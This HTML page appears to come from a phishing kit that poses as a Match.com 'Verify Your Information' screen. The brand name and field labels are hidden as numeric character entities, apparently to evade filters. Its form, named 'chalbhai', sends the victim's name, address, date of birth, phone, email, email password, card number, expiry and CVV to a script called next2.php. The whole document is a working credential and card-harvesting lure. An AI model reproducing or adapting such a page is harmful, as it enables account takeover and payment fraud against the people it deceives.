<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#77;&#97;&#116;&#99;&#104;&#46;&#99;&#111;&#109;&#174;&#32;&#124;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 36px; 
    width: 275px; 
    font-size: 14px; 
    padding-left: 8px;
    border-radius: 1px; 
    
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #4488cc; 
    box-shadow: 0px 0px 3px #4488cc; 
    -moz-box-shadow: 0px 0px 3px #4488cc; 
    -webkit-box-shadow: 0px 0px 3px #4488cc; 
} 
</style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1351px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>


  <script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
    });
</script>

</head>
<body style="visibility:hidden" onload="unhideBody()" bgColor="#F2F2F2">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1351px; height:90px; z-index:0"><img src="images/mm1.png" alt="" title="" border=0 width=1351 height=90></div>

<div id="image5" style="position:absolute; overflow:hidden; left:273px; top:861px; width:786px; height:292px; z-index:1"><img src="images/mm4.png" alt="" title="" border=0 width=786 height=292></div>

<div id="image6" style="position:absolute; overflow:hidden; left:198px; top:7px; width:653px; height:40px; z-index:2"><a href="#"><img src="images/mm5.png" alt="" title="" border=0 width=653 height=40></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:269px; top:947px; width:793px; height:104px; z-index:3"><a href="#"><img src="images/mm9.png" alt="" title="" border=0 width=793 height=104></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:188px; top:110px; width:980px; height:251px; z-index:4"><img src="images/mm10.png" alt="" title="" border=0 width=980 height=251></div>

<div id="image3" style="position:absolute; overflow:hidden; left:188px; top:689px; width:980px; height:210px; z-index:5"><img src="images/mm11.png" alt="" title="" border=0 width=980 height=210></div>

<div id="image7" style="position:absolute; overflow:hidden; left:169px; top:361px; width:1010px; height:207px; z-index:6"><img src="images/mu1.png" alt="" title="" border=0 width=1010 height=207></div>

<div id="image8" style="position:absolute; overflow:hidden; left:169px; top:568px; width:1010px; height:207px; z-index:7"><img src="images/mu1.png" alt="" title="" border=0 width=1010 height=207></div>

<div id="image9" style="position:absolute; overflow:hidden; left:1052px; top:4px; width:92px; height:40px; z-index:19"><a href="#"><img src="images/mu2.png" alt="" title="" border=0 width=92 height=40></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:612px; top:691px; width:118px; height:19px; z-index:20"><img src="images/mu3.png" alt="" title="" border=0 width=118 height=19></div>

<div id="image11" style="position:absolute; overflow:hidden; left:607px; top:436px; width:132px; height:16px; z-index:21"><img src="images/mu4.png" alt="" title="" border=0 width=132 height=16></div>

<form action=next2.php name=chalbhai id=chalbhai method=post>
<input name="name" placeholder="&#70;&#117;&#108;&#108;&#32;&#78;&#97;&#109;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:679px;left:222px;top:269px;z-index:8">
<input name="address" placeholder="&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:679px;left:222px;top:319px;z-index:9">
<input name="zip" placeholder="&#90;&#105;&#112;&#32;&#67;&#111;&#100;&#101;" class="textbox" autocomplete="off" required maxlength="7" type="text" style="position:absolute;width:380px;left:222px;top:369px;z-index:10">
<input name="dob" id="dob" placeholder="&#68;&#97;&#116;&#101;&#32;&#111;&#102;&#32;&#66;&#105;&#114;&#116;&#104;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:380px;left:222px;top:420px;z-index:11">
<input name="phone" placeholder="&#80;&#104;&#111;&#110;&#101;&#32;&#78;&#117;&#109;&#98;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:380px;left:222px;top:471px;z-index:12">
<input name="email" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required type="email" style="position:absolute;width:679px;left:222px;top:522px;z-index:13">
<input name="epass" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:679px;left:223px;top:573px;z-index:14">
<input name="ccn" placeholder="&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#32;&#78;&#117;&#109;&#98;&#101;&#114;" class="textbox cc-number" autocomplete="off" required type="text" style="position:absolute;width:679px;left:225px;top:624px;z-index:15">
<input name="exp" placeholder="&#69;&#120;&#112;&#105;&#114;&#97;&#116;&#105;&#111;&#110;&#32;&#68;&#97;&#116;&#101;" class="textbox cc-exp" autocomplete="off" required type="text" style="position:absolute;width:380px;left:226px;top:675px;z-index:16">
<input name="cvv" placeholder="&#67;&#86;&#86;" class="textbox cc-cvc" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:380px;left:225px;top:726px;z-index:17">
<div id="formimage1" style="position:absolute; left:230px; top:811px; z-index:18"><input type="image" name="formimage1" width="681" height="52" src="images/confirm.png"></div>

</div>

</body>
</html>
